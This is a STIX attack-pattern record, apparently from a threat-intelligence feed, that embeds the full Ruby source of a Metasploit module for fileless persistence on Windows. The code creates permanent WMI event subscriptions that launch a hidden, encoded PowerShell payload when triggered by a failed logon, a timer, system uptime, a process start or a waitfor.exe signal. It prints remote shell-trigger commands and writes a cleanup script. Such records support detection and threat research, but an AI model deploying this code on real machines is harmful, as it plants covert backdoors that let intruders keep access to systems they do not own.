{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--72258a6a-9dac-4cb7-bfae-c66ebe184f55",
    "created": "2024-08-14T16:49:47.890816Z",
    "modified": "2024-08-14T16:49:47.890821Z",
    "name": "WMI Event Subscription Persistence",
    "description": " This module will create a permanent WMI event subscription to achieve file-less persistence using one of five methods. The EVENT method will create an event filter that will query the event log for an EVENT_ID_TRIGGER (default: failed logon request id 4625) that also contains a specified USERNAME_TRIGGER (note: failed logon auditing must be enabled on the target for this method to work, this can be enabled using \"auditpol.exe /set /subcategory:Logon /failure:Enable\"). When these criteria are met a command line event consumer will trigger an encoded powershell payload. The INTERVAL method will create an event filter that triggers the payload after the specified CALLBACK_INTERVAL. The LOGON method will create an event filter that will trigger the payload after the system has an uptime of 4 minutes. The PROCESS method will create an event filter that triggers the payload when the specified process is started. The WAITFOR method creates an event filter that utilizes the Microsoft binary waitfor.exe to wait for a signal specified by WAITFOR_TRIGGER before executing the payload. The signal can be sent from a windows host on a LAN utilizing the waitfor.exe command (note: requires target to have port 445 open). Additionally a custom command can be specified to run once the trigger is activated using the advanced option CUSTOM_PS_COMMAND. This module requires administrator level privileges as well as a high integrity process. It is also recommended not to use stageless payloads due to powershell script length limitations. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/wmi_persistence.rb",
            "external_id": "wmi_persistence.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf"
        },
        {
            "source_name": "reference",
            "url": "https://learn-powershell.net/2013/08/14/powershell-and-events-permanent-wmi-event-subscriptions/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = NormalRanking\n\n  include Msf::Post::Windows::Powershell\n  include Msf::Exploit::Powershell\n  include Post::Windows::Priv\n  include Msf::Post::File\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'             => 'WMI Event Subscription Persistence',\n      'Description'      => %q{\n          This module will create a permanent WMI event subscription to achieve file-less persistence using one\n          of five methods. The EVENT method will create an event filter that will query the event log for an EVENT_ID_TRIGGER\n          (default: failed logon request id 4625) that also contains a specified USERNAME_TRIGGER (note: failed logon auditing\n          must be enabled on the target for this method to work, this can be enabled using \"auditpol.exe /set /subcategory:Logon\n          /failure:Enable\"). When these criteria are met a command line event consumer will trigger an encoded powershell payload.\n          The INTERVAL method will create an event filter that triggers the payload after the specified CALLBACK_INTERVAL. The LOGON\n          method will create an event filter that will trigger the payload after the system has an uptime of 4 minutes. The PROCESS\n          method will create an event filter that triggers the payload when the specified process is started. The WAITFOR method\n          creates an event filter that utilizes the Microsoft binary waitfor.exe to wait for a signal specified by WAITFOR_TRIGGER\n          before executing the payload. The signal can be sent from a windows host on a LAN utilizing the waitfor.exe command\n          (note: requires target to have port 445 open). Additionally a custom command can be specified to run once the trigger is\n          activated using the advanced option CUSTOM_PS_COMMAND. This module requires administrator level privileges as well as a\n          high integrity process. It is also recommended not to use stageless payloads due to powershell script length limitations.\n        },\n      'Author'           => ['Nick Tyrer <@NickTyrer>'],\n      'License'          => MSF_LICENSE,\n      'Privileged'       => true,\n      'Platform'         => 'win',\n      'SessionTypes'  => ['meterpreter'],\n      'Targets'       => [['Windows', {}]],\n      'DisclosureDate' => '2017-06-06',\n      'DefaultTarget'    => 0,\n      'DefaultOptions' =>\n        {\n          'DisablePayloadHandler' => true\n        },\n      'References' => [\n        ['URL', 'https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf'],\n        ['URL', 'https://learn-powershell.net/2013/08/14/powershell-and-events-permanent-wmi-event-subscriptions/']\n      ]\n    ))\n\n    register_options([\n      OptEnum.new('PERSISTENCE_METHOD',\n        [true, 'Method to trigger the payload.', 'EVENT', ['EVENT','INTERVAL','LOGON','PROCESS', 'WAITFOR']]),\n      OptInt.new('EVENT_ID_TRIGGER',\n        [true, 'Event ID to trigger the payload. (Default: 4625)', 4625]),\n      OptString.new('USERNAME_TRIGGER',\n        [true, 'The username to trigger the payload. (Default: BOB)', 'BOB' ]),\n      OptString.new('PROCESS_TRIGGER',\n        [true, 'The process name to trigger the payload. (Default: CALC.EXE)', 'CALC.EXE' ]),\n      OptString.new('WAITFOR_TRIGGER',\n        [true, 'The word to trigger the payload. (Default: CALL)', 'CALL' ]),\n      OptInt.new('CALLBACK_INTERVAL',\n        [true, 'Time between callbacks (In milliseconds). (Default: 1800000).', 1800000 ]),\n      OptString.new('CLASSNAME',\n        [true, 'WMI event class name. (Default: UPDATER)', 'UPDATER' ])\n    ])\n\n    register_advanced_options(\n      [\n        OptString.new('CUSTOM_PS_COMMAND',\n        [false, 'Custom powershell command to run once the trigger is activated. (Note: some commands will need to be encolsed in quotes)', false, ]),\n    ])\n  end\n\n\n  def exploit\n   unless have_powershell?\n      print_error(\"This module requires powershell to run\")\n      return\n   end\n\n   unless is_admin?\n      print_error(\"This module requires admin privs to run\")\n      return\n   end\n\n   unless is_high_integrity?\n      print_error(\"This module requires UAC to be bypassed first\")\n      return\n   end\n\n   if is_system?\n      print_error(\"This module cannot run as System\")\n      return\n   end\n\n   host = session.session_host\n   print_status('Installing Persistence...')\n\n   case datastore['PERSISTENCE_METHOD']\n    when 'LOGON'\n      psh_exec(subscription_logon)\n      print_good \"Persistence installed!\"\n      remove_persistence\n    when 'INTERVAL'\n      psh_exec(subscription_interval)\n      print_good \"Persistence installed!\"\n      remove_persistence\n    when 'EVENT'\n      psh_exec(subscription_event)\n      print_good \"Persistence installed! Call a shell using \\\"smbclient \\\\\\\\\\\\\\\\#{host}\\\\\\\\C$ -U \"+datastore['USERNAME_TRIGGER']+\" <arbitrary password>\\\"\"\n      remove_persistence\n    when 'PROCESS'\n      psh_exec(subscription_process)\n      print_good \"Persistence installed!\"\n      remove_persistence\n    when 'WAITFOR'\n      psh_exec(subscription_waitfor)\n      print_good \"Persistence installed! Call a shell using \\\"waitfor.exe /S #{host} /SI \"+datastore['WAITFOR_TRIGGER']+\"\\\"\"\n      remove_persistence\n    end\n   end\n\n\n  def build_payload\n    if datastore['CUSTOM_PS_COMMAND']\n      script_in = datastore['CUSTOM_PS_COMMAND']\n      compressed_script = compress_script(script_in, eof = nil)\n      encoded_script = encode_script(compressed_script, eof = nil)\n      generate_psh_command_line(noprofile: true, windowstyle: 'hidden', encodedcommand: encoded_script)\n    else\n      cmd_psh_payload(payload.encoded, payload_instance.arch.first, encode_final_payload: true, remove_comspec: true)\n    end\n  end\n\n\n  def subscription_logon\n   command = build_payload\n   class_name = datastore['CLASSNAME']\n   <<-HEREDOC\n    $filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments @{EventNamespace = 'root/cimv2'; Name = \\\"#{class_name}\\\"; Query = \\\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\\\"; QueryLanguage = 'WQL'}\n    $consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments @{Name = \\\"#{class_name}\\\"; CommandLineTemplate = \\\"#{command}\\\"}\n    $FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments @{Filter = $Filter; Consumer = $Consumer}\n   HEREDOC\n  end\n\n\n  def subscription_interval\n   command = build_payload\n   class_name = datastore['CLASSNAME']\n   callback_interval = datastore['CALLBACK_INTERVAL']\n   <<-HEREDOC\n    $timer = Set-WmiInstance -Namespace root/cimv2 -Class __IntervalTimerInstruction -Arguments @{ IntervalBetweenEvents = ([UInt32] #{callback_interval}); SkipIfPassed = $false; TimerID = \\\"Trigger\\\"}\n    $filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments @{EventNamespace = 'root/cimv2'; Name = \\\"#{class_name}\\\"; Query = \\\"Select * FROM __TimerEvent WHERE TimerID = 'trigger'\\\"; QueryLanguage = 'WQL'}\n    $consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments @{Name = \\\"#{class_name}\\\"; CommandLineTemplate = \\\"#{command}\\\"}\n    $FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments @{Filter = $Filter; Consumer = $Consumer}\n   HEREDOC\n  end\n\n\n  def subscription_event\n   command = build_payload\n   event_id = datastore['EVENT_ID_TRIGGER']\n   username = datastore['USERNAME_TRIGGER']\n   class_name = datastore['CLASSNAME']\n   <<-HEREDOC\n    $filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments @{EventNamespace = 'root/cimv2'; Name = \\\"#{class_name}\\\"; Query = \\\"SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND Targetinstance.EventCode = '#{event_id}' And Targetinstance.Message Like '%#{username}%'\\\"; QueryLanguage = 'WQL'}\n    $consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments @{Name = \\\"#{class_name}\\\"; CommandLineTemplate = \\\"#{command}\\\"}\n    $FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments @{Filter = $Filter; Consumer = $Consumer}\n   HEREDOC\n  end\n\n\n  def subscription_process\n   command = build_payload\n   class_name = datastore['CLASSNAME']\n   process_name = datastore['PROCESS_TRIGGER']\n   <<-HEREDOC\n    $filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments @{EventNamespace = 'root/cimv2'; Name = \\\"#{class_name}\\\"; Query = \\\"SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName= '#{process_name}'\\\"; QueryLanguage = 'WQL'}\n    $consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments @{Name = \\\"#{class_name}\\\"; CommandLineTemplate = \\\"#{command}\\\"}\n    $FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments @{Filter = $Filter; Consumer = $Consumer}\n   HEREDOC\n  end\n\n\n  def subscription_waitfor\n   command = build_payload\n   word = datastore['WAITFOR_TRIGGER']\n   class_name = datastore['CLASSNAME']\n   <<-HEREDOC\n    $filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments @{EventNamespace = 'root/cimv2'; Name = \\\"#{class_name}\\\"; Query = \\\"SELECT * FROM __InstanceDeletionEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND Targetinstance.Name = 'waitfor.exe'\\\"; QueryLanguage = 'WQL'}\n    $consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments @{Name = \\\"#{class_name}\\\"; CommandLineTemplate = \\\"cmd.exe /C waitfor.exe #{word} && #{command} && taskkill /F /IM cmd.exe\\\"}\n    $FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments @{Filter = $Filter; Consumer = $Consumer}\n    $filter1 = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments @{EventNamespace = 'root/cimv2'; Name = \\\"Telemetrics\\\"; Query = \\\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\\\"; QueryLanguage = 'WQL'}\n    $consumer1 = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments @{Name = \\\"Telemetrics\\\"; CommandLineTemplate = \\\"waitfor.exe #{word}\\\"}\n    $FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments @{Filter = $Filter1; Consumer = $Consumer1}\n    Start-Process -FilePath waitfor.exe #{word} -NoNewWindow\n   HEREDOC\n  end\n\n\n  def log_file\n    host = session.session_host\n    filenameinfo = \"_\" + ::Time.now.strftime(\"%Y%m%d.%M%S\")\n    logs = ::File.join(Msf::Config.log_directory, 'wmi_persistence',\n    Rex::FileUtils.clean_path(host + filenameinfo))\n    ::FileUtils.mkdir_p(logs)\n    logfile = ::File.join(logs, Rex::FileUtils.clean_path(host + filenameinfo) + '.rc')\n  end\n\n\n  def remove_persistence\n    name_class = datastore['CLASSNAME']\n    clean_rc = log_file\n      if datastore['PERSISTENCE_METHOD'] == \"WAITFOR\"\n        clean_up_rc = \"\"\n        clean_up_rc << \"execute -H -f wmic -a \\\"/NAMESPACE:\\\\\\\"\\\\\\\\\\\\\\\\root\\\\\\\\subscription\\\\\\\" PATH __EventFilter WHERE Name=\\\\\\\"Telemetrics\\\\\\\" DELETE\\\"\\n\"\n        clean_up_rc << \"execute -H -f wmic -a \\\"/NAMESPACE:\\\\\\\"\\\\\\\\\\\\\\\\root\\\\\\\\subscription\\\\\\\" PATH CommandLineEventConsumer WHERE Name=\\\\\\\"Telemetrics\\\\\\\" DELETE\\\"\\n\"\n        clean_up_rc << \"execute -H -f wmic -a \\\"/NAMESPACE:\\\\\\\"\\\\\\\\\\\\\\\\root\\\\\\\\subscription\\\\\\\" PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name=\\\\\\\"Telemetrics\\\\\\\"' DELETE\\\"\\n\"\n        clean_up_rc << \"execute -H -f wmic -a \\\"/NAMESPACE:\\\\\\\"\\\\\\\\\\\\\\\\root\\\\\\\\subscription\\\\\\\" PATH __EventFilter WHERE Name=\\\\\\\"#{name_class}\\\\\\\" DELETE\\\"\\n\"\n        clean_up_rc << \"execute -H -f wmic -a \\\"/NAMESPACE:\\\\\\\"\\\\\\\\\\\\\\\\root\\\\\\\\subscription\\\\\\\" PATH CommandLineEventConsumer WHERE Name=\\\\\\\"#{name_class}\\\\\\\" DELETE\\\"\\n\"\n        clean_up_rc << \"execute -H -f wmic -a \\\"/NAMESPACE:\\\\\\\"\\\\\\\\\\\\\\\\root\\\\\\\\subscription\\\\\\\" PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name=\\\\\\\"#{name_class}\\\\\\\"' DELETE\\\"\"\n      else\n        clean_up_rc = \"\"\n        clean_up_rc << \"execute -H -f wmic -a \\\"/NAMESPACE:\\\\\\\"\\\\\\\\\\\\\\\\root\\\\\\\\subscription\\\\\\\" PATH __EventFilter WHERE Name=\\\\\\\"#{name_class}\\\\\\\" DELETE\\\"\\n\"\n        clean_up_rc << \"execute -H -f wmic -a \\\"/NAMESPACE:\\\\\\\"\\\\\\\\\\\\\\\\root\\\\\\\\subscription\\\\\\\" PATH CommandLineEventConsumer WHERE Name=\\\\\\\"#{name_class}\\\\\\\" DELETE\\\"\\n\"\n        clean_up_rc << \"execute -H -f wmic -a \\\"/NAMESPACE:\\\\\\\"\\\\\\\\\\\\\\\\root\\\\\\\\subscription\\\\\\\" PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name=\\\\\\\"#{name_class}\\\\\\\"' DELETE\\\"\"\n      end\n    file_local_write(clean_rc, clean_up_rc)\n    print_status(\"Clean up Meterpreter RC file: #{clean_rc}\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-06-06",
    "x_mitre_platforms": [
        "win'"
    ]
}